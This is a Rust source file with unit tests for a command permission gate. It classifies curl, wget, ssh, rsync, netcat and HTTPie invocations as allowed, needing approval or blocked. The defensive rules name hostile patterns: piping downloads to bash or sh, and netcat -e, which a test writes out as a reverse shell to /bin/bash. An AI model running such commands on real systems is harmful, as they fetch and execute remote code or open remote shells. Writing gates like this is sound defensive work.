//! Network command permission gate (curl, wget, ssh, etc.).

use crate::models::{CommandInfo, GateResult};

/// Check network commands.
pub fn check_network(cmd: &CommandInfo) -> GateResult {
    match cmd.program.as_str() {
        "curl" => check_curl(cmd),
        "wget" => check_wget(cmd),
        "ssh" | "scp" | "sftp" | "rsync" => check_ssh_family(cmd),
        "nc" | "ncat" | "netcat" => check_netcat(cmd),
        "http" | "https" | "xh" => check_httpie(cmd),
        _ => GateResult::skip(),
    }
}

/// Check curl command.
fn check_curl(cmd: &CommandInfo) -> GateResult {
    let args = &cmd.args;

    // Pipe to shell is caught by router, but double-check here
    if cmd.raw.contains("| bash")
        || cmd.raw.contains("| sh")
        || cmd.raw.contains("|bash")
        || cmd.raw.contains("|sh")
    {
        return GateResult::ask("curl: Piping to shell");
    }

    // Version/help - allow
    if args
        .iter()
        .any(|a| a == "--version" || a == "-h" || a == "--help")
    {
        return GateResult::allow();
    }

    let mut method = "GET";
    let mut has_data = false;
    let mut has_output = false;
    let mut is_head_request = false;

    let mut i = 0;
    while i < args.len() {
        let arg = args[i].as_str();

        // Method flags
        if (arg == "-X" || arg == "--request") && i + 1 < args.len() {
            method = &args[i + 1];
            i += 1;
        } else if let Some(m) = arg.strip_prefix("-X") {
            method = m;
        } else if let Some(m) = arg.strip_prefix("--request=") {
            method = m;
        }
        // Data flags (implies mutation)
        else if matches!(
            arg,
            "-d" | "--data"
                | "--data-raw"
                | "--data-binary"
                | "--data-urlencode"
                | "-F"
                | "--form"
                | "-T"
                | "--upload-file"
                | "--json"
        ) {
            has_data = true;
        }
        // Output flags
        else if matches!(arg, "-o" | "--output" | "-O" | "--remote-name") {
            has_output = true;
        }
        // HEAD request
        else if arg == "-I" || arg == "--head" {
            is_head_request = true;
        }

        i += 1;
    }

    // HEAD requests are always safe
    if is_head_request {
        return GateResult::allow();
    }

    // Data implies mutation
    if has_data {
        return GateResult::ask(format!("curl: {} with data", method.to_uppercase()));
    }

    // Non-GET methods
    let method_upper = method.to_uppercase();
    if matches!(method_upper.as_str(), "POST" | "PUT" | "DELETE" | "PATCH") {
        return GateResult::ask(format!("curl: {method_upper} request"));
    }

    // Downloading to file
    if has_output {
        return GateResult::ask("curl: Downloading file");
    }

    // Simple GET - allow
    GateResult::allow()
}

/// Check wget command.
fn check_wget(cmd: &CommandInfo) -> GateResult {
    let args = &cmd.args;

    // Pipe to shell is caught by router, but double-check here
    if cmd.raw.contains("| bash") || cmd.raw.contains("| sh") {
        return GateResult::ask("wget: Piping to shell");
    }

    // Version/help - allow
    if args
        .iter()
        .any(|a| a == "--version" || a == "-h" || a == "--help")
    {
        return GateResult::allow();
    }

    // Spider mode - read only
    if args.iter().any(|a| a == "--spider") {
        return GateResult::allow();
    }

    // Check for dangerous patterns
    for arg in args {
        match arg.as_str() {
            "-O" | "--output-document" | "-P" | "--directory-prefix" => {
                return GateResult::ask("wget: Downloading file");
            }
            "-r" | "--recursive" => return GateResult::ask("wget: Recursive download"),
            "-m" | "--mirror" => return GateResult::ask("wget: Mirroring site"),
            "--post-data" | "--post-file" => return GateResult::ask("wget: POST request"),
            _ => {}
        }
    }

    // Default wget downloads - ask
    GateResult::ask("wget: Downloading")
}

/// Check ssh/scp/sftp/rsync commands.
fn check_ssh_family(cmd: &CommandInfo) -> GateResult {
    let program = cmd.program.as_str();
    let args = &cmd.args;

    // rsync dry-run is safe
    if program == "rsync" {
        if args.iter().any(|a| a == "-n" || a == "--dry-run") {
            return GateResult::allow();
        }
        return GateResult::ask("rsync: File sync");
    }

    // All others require approval
    let action = match program {
        "ssh" => "Remote connection",
        "scp" | "sftp" => "File transfer",
        _ => "Remote operation",
    };

    GateResult::ask(format!("{program}: {action}"))
}

/// Check netcat commands.
fn check_netcat(cmd: &CommandInfo) -> GateResult {
    let args = &cmd.args;

    // Execute mode - blocked (reverse shell pattern)
    if args.iter().any(|a| a == "-e") {
        return GateResult::block("Netcat -e blocked (reverse shell risk)");
    }

    // Listen mode - ask
    if args.iter().any(|a| a == "-l") {
        return GateResult::ask("netcat: Listen mode (opens port)");
    }

    // Regular connection - ask
    GateResult::ask("netcat: Network connection")
}

/// Check `HTTPie` (`http`/`https`/`xh`) commands.
fn check_httpie(cmd: &CommandInfo) -> GateResult {
    let args = &cmd.args;

    if args.is_empty() {
        return GateResult::allow();
    }

    // Version/help
    if args.iter().any(|a| a == "--version" || a == "--help") {
        return GateResult::allow();
    }

    // Check first arg for method
    let first = args[0].to_uppercase();

    if first == "GET" {
        return GateResult::allow();
    }

    if matches!(first.as_str(), "POST" | "PUT" | "DELETE" | "PATCH") {
        return GateResult::ask(format!("HTTPie: {first} request"));
    }

    // If first arg is a URL (no method), default is GET
    if args[0].starts_with("http://") || args[0].starts_with("https://") {
        return GateResult::allow();
    }

    GateResult::ask("HTTPie: Request")
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::gates::test_utils::cmd;
    use crate::models::Decision;

    // === Curl ===

    mod curl {
        use super::*;

        #[test]
        fn test_safe_requests_allow() {
            let safe_cmds = [
                &["https://api.example.com"][..],
                &["--version"],
                &["-h"],
                &["-I", "https://example.com"],
                &["--head", "https://example.com"],
            ];

            for args in safe_cmds {
                let result = check_network(&cmd("curl", args));
                assert_eq!(result.decision, Decision::Allow, "Failed for: {args:?}");
            }
        }

        #[test]
        fn test_risky_requests_ask() {
            let risky_cmds = [
                (&["-X", "POST", "https://api.example.com"][..], "POST"),
                (&["-X", "PUT", "https://api.example.com"], "PUT"),
                (&["-X", "DELETE", "https://api.example.com"], "DELETE"),
                (
                    &["-d", "{\"key\":\"value\"}", "https://api.example.com"],
                    "with data",
                ),
                (
                    &["--data", "key=value", "https://api.example.com"],
                    "with data",
                ),
                (
                    &["-F", "file=@upload.txt", "https://api.example.com"],
                    "with data",
                ),
                (&["-o", "output.html", "https://example.com"], "Downloading"),
                (&["-O", "https://example.com/file.zip"], "Downloading"),
            ];

            for (args, expected) in risky_cmds {
                let result = check_network(&cmd("curl", args));
                assert_eq!(result.decision, Decision::Ask, "Failed for: {args:?}");
                assert!(
                    result.reason.as_ref().unwrap().contains(expected),
                    "Failed for: {args:?}"
                );
            }
        }
    }

    // === Wget ===

    mod wget {
        use super::*;

        #[test]
        fn test_safe_requests_allow() {
            let safe_cmds = [
                &["--version"][..],
                &["-h"],
                &["--spider", "https://example.com"],
            ];

            for args in safe_cmds {
                let result = check_network(&cmd("wget", args));
                assert_eq!(result.decision, Decision::Allow, "Failed for: {args:?}");
            }
        }

        #[test]
        fn test_risky_requests_ask() {
            let risky_cmds = [
                (&["https://example.com"][..], "Downloading"),
                (
                    &["-O", "file.zip", "https://example.com/file.zip"],
                    "Downloading",
                ),
                (&["-r", "https://example.com"], "Recursive"),
                (&["--mirror", "https://example.com"], "Mirroring"),
                (
                    &["--post-data", "key=value", "https://api.example.com"],
                    "POST",
                ),
            ];

            for (args, expected) in risky_cmds {
                let result = check_network(&cmd("wget", args));
                assert_eq!(result.decision, Decision::Ask, "Failed for: {args:?}");
                assert!(
                    result.reason.as_ref().unwrap().contains(expected),
                    "Failed for: {args:?}"
                );
            }
        }
    }

    // === SSH Family ===

    mod ssh_family {
        use super::*;

        #[test]
        fn test_ssh_family_asks() {
            let ssh_cmds = [
                ("ssh", "Remote connection"),
                ("scp", "File transfer"),
                ("sftp", "File transfer"),
            ];

            for (program, expected) in ssh_cmds {
                let result = check_network(&cmd(program, &["user@host"]));
                assert_eq!(result.decision, Decision::Ask, "Failed for: {program}");
                assert!(
                    result.reason.as_ref().unwrap().contains(expected),
                    "Failed for: {program}"
                );
            }
        }

        #[test]
        fn test_rsync_dry_run_allows() {
            let result = check_network(&cmd("rsync", &["-n", "-av", "src/", "dest/"]));
            assert_eq!(result.decision, Decision::Allow);
        }

        #[test]
        fn test_rsync_real_asks() {
            let result = check_network(&cmd("rsync", &["-av", "src/", "dest/"]));
            assert_eq!(result.decision, Decision::Ask);
            assert!(
                result
                    .reason
                    .as_ref()
                    .unwrap()
                    .to_lowercase()
                    .contains("sync")
            );
        }
    }

    // === Netcat ===

    mod netcat {
        use super::*;

        #[test]
        fn test_nc_execute_blocks() {
            let result = check_network(&cmd("nc", &["-e", "/bin/bash", "host", "1234"]));
            assert_eq!(result.decision, Decision::Block);
            assert!(
                result
                    .reason
                    .as_ref()
                    .unwrap()
                    .to_lowercase()
                    .contains("reverse shell")
            );
        }

        #[test]
        fn test_nc_listen_asks() {
            let result = check_network(&cmd("nc", &["-l", "1234"]));
            assert_eq!(result.decision, Decision::Ask);
            assert!(result.reason.as_ref().unwrap().contains("Listen"));
        }

        #[test]
        fn test_nc_connect_asks() {
            let result = check_network(&cmd("nc", &["host", "1234"]));
            assert_eq!(result.decision, Decision::Ask);
        }
    }

    // === HTTPie ===

    mod httpie {
        use super::*;

        #[test]
        fn test_get_allows() {
            for program in ["http", "https", "xh"] {
                let result = check_network(&cmd(program, &["GET", "https://api.example.com"]));
                assert_eq!(result.decision, Decision::Allow, "Failed for: {program}");
            }
        }

        #[test]
        fn test_url_only_allows() {
            for program in ["http", "https", "xh"] {
                let result = check_network(&cmd(program, &["https://api.example.com"]));
                assert_eq!(result.decision, Decision::Allow, "Failed for: {program}");
            }
        }

        #[test]
        fn test_mutating_methods_ask() {
            for program in ["http", "https", "xh"] {
                for method in ["POST", "PUT", "DELETE", "PATCH"] {
                    let result = check_network(&cmd(program, &[method, "https://api.example.com"]));
                    assert_eq!(
                        result.decision,
                        Decision::Ask,
                        "Failed for: {program} {method}"
                    );
                    assert!(result.reason.as_ref().unwrap().contains(method));
                }
            }
        }
    }
}
